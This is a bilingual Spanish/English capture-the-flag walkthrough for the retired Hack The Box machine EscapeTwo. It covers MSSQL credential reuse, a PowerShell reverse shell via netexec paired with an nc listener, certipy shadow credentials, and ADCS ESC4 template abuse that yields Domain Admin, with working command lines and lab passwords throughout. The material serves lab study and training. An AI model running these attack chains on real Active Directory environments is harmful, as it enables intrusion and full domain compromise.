# EscapeTwo [Easy]

> **ES:** Controlador de dominio Windows (assume-breach con `rose`); de MSSQL `sa` a `sql_svc` y de ADCS ESC4 a Administrador del dominio.
> **EN:** Windows domain controller (assume-breach as `rose`); from MSSQL `sa` to `sql_svc` and via ADCS ESC4 to Domain Admin.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Windows |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/EscapeTwo] |
| **URL** | https://app.hackthebox.com/machines/EscapeTwo |
| **IP lab** | 10.10.11.51 |
| **Fecha de resolución** | 2026-09-24 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía credenciales iniciales `rose` → Excel con creds MSSQL `sa` → shell `sql_svc` → shadow creds + ADCS ESC4 → `Administrator`.
> **EN:** Get `user.txt` and `root.txt` via starter creds `rose` → Excel with MSSQL `sa` creds → `sql_svc` shell → shadow creds + ADCS ESC4 → `Administrator`.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] netexec (smb/ldap/mssql)
- [ ] mssqlclient / xp_cmdshell
- [ ] bloodhound / certipy-ad
- [ ] evil-winrm

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Es DC (`sequel.htb`/`DC01`): DNS, Kerberos, LDAP/LDAPS, SMB, MSSQL 2019. Se parte con `rose : KxEPkKe6R8su`.
> **EN:** It is a DC (`sequel.htb`/`DC01`): DNS, Kerberos, LDAP/LDAPS, SMB, MSSQL 2019. Start with `rose : KxEPkKe6R8su`.

```bash
nmap -sC -sV -p- -oN nmap_init 10.10.11.51
echo '10.10.11.51 sequel.htb DC01.sequel.htb' | sudo tee -a /etc/hosts
nxc smb sequel.htb -u rose -p 'KxEPkKe6R8su' --users
```

**Resultado / Result:** Dominio `sequel.htb`, host `DC01`, MSSQL 1433, AD funcional. Capturas en `img/` de apoyo.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** Con `rose` se enumeran shares SMB; un Excel expone tabla de usuarios y la cuenta `sa` de MSSQL. Se valida con `--local-auth`.
> **EN:** With `rose` enumerate SMB shares; an Excel sheet leaks a user table and the MSSQL `sa` account. Validate with `--local-auth`.

```bash
nxc smb sequel.htb -u rose -p 'KxEPkKe6R8su' --shares
# descargar xlsx del share y leer tabla (angela/oscar/kevin/sa)
nxc mssql sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth
```

**Resultado / Result:** Credencial `sa : MSSQLP@ssw0rd!` válida (Pwn3d).

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Ejecución vía MSSQL (`xp_cmdshell`-like con netexec `-x`) para reverse shell PowerShell como `SEQUEL\sql_svc`; luego se sube payload y sesión Meterpreter para persistencia.
> **EN:** Code exec via MSSQL (`xp_cmdshell`-like with netexec `-x`) for a PowerShell reverse shell as `SEQUEL\sql_svc`; then stage a payload/Meterpreter session.

```bash
nc -lvnp 9999
nxc mssql sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x 'powershell -e <base64-revshell>'
# en el target como sql_svc:
whoami  # sequel\sql_svc
```

**Resultado / Result:** Shell como `sql_svc` en el DC.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** Desde `sql_svc` se hace shadow/extracción de credenciales (`ryan`, `ca_svc`) y movimiento lateral hasta leer `user.txt` (flag omitida).
> **EN:** From `sql_svc` perform shadow/credential extraction (`ryan`, `ca_svc`) and lateral move to read `user.txt` (flag redacted).

```bash
certipy-ad shadow auto -u 'ryan@sequel.htb' -p '<pass>' -dc-ip 10.10.11.51 -target DC01.sequel.htb -account ca_svc
nxc smb sequel.htb -u <user> -p '<pass>' --shares
```

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `certipy find -vulnerable` marca ESC4 en la plantilla `DunderMifflinAuthentication` (grupo Cert Publishers con permisos peligrosos). Se reescribe la plantilla, se pide cert con UPN `Administrator`, se autentica y se entra con evil-winrm/NT hash.
> **EN:** `certipy find -vulnerable` flags ESC4 on template `DunderMifflinAuthentication` (Cert Publishers with dangerous rights). Rewrite template, request cert with UPN `Administrator`, auth and login via evil-winrm/NT hash.

```bash
certipy-ad find -scheme ldap -target DC01.sequel.htb -dc-ip 10.10.11.51 -vulnerable -stdout
certipy-ad template -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.10.11.51
certipy-ad req -u ca_svc -hashes '<nthash>' -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@sequel.htb
certipy-ad auth -pfx ./administrator.pfx -dc-ip 10.10.11.51
evil-winrm -i 10.10.11.51 -u Administrator -H '<nthash>'
# C:\Users\Administrator\Desktop\root.txt
```

**Resultado / Result:** Certificado de Domain Admin → hash NT de `Administrator` → WinRM. Técnica: ADCS ESC4.

---

## 🧠 Lo aprendido / Learned

> **ES:** Escenario assume-breach; Excel con secretos; MSSQL como foothold en DC; ADCS ESC4 (plantillas con ACL débiles) hasta Domain Admin.
> **EN:** Assume-breach scenario; secrets in Excel; MSSQL as DC foothold; ADCS ESC4 (weak template ACLs) to Domain Admin.

- [ ] `xp_cmdshell` / netexec `-x` para RCE vía MSSQL
- [ ] certipy `shadow`, `find`, `template`, `req`, `auth`
- [ ] Mitigar ESC4 endureciendo ACLs de plantillas

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** HTB EscapeTwo — 0xdf (https://0xdf.gitlab.io/2025/05/24/htb-escapetwo.html) — 0xdf
- **Walkthrough de referencia:** HTB EscapeTwo — ADCS ESC4 Study Case (https://medium.com/@iceicemelt2/active-directory-certificate-services-ad-cs-study-case-htb-escapetwo-f1ce3bcb4516)
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
- **Nota de migración:** Contenido migrado y parafraseado desde `Soluciones/Machines/unclasified/EscapeTwo/index.md` (notas CN/EN sin normalizar con capturas en `img/`); flags y hashes originales omitidos.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
